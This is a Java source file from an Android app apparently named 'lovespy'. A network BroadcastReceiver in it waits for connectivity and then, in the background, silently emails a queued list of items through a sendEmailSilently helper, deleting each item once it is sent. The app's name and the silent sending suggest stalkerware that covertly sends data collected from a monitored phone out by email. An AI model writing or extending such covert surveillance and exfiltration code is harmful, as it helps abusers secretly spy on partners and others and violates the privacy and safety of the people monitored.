package com.example.lovespy.app.network;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;

import com.example.lovespy.app.email.EmailHelper;

import java.util.ArrayList;
import java.util.Iterator;

public class NetworkUpdateReceiver extends BroadcastReceiver {

    private static ArrayList<String> mList;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (NetworkStatus.getInstance(context).isOnline()) {
            if (mList != null && mList.size() != 0) {
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected Void doInBackground(Void... params) {
                        Iterator<String> iter = mList.iterator();
                        while (iter.hasNext()) {
                            boolean sending = EmailHelper.sendEmailSilently(iter.next());
                            if (sending == true) {
                                iter.remove();
                            }
                        }
                        return null;
                    }
                }.execute();
            }
        }
    }

    public static void setLetterList(ArrayList<String> list) {
        mList = list;
    }
}
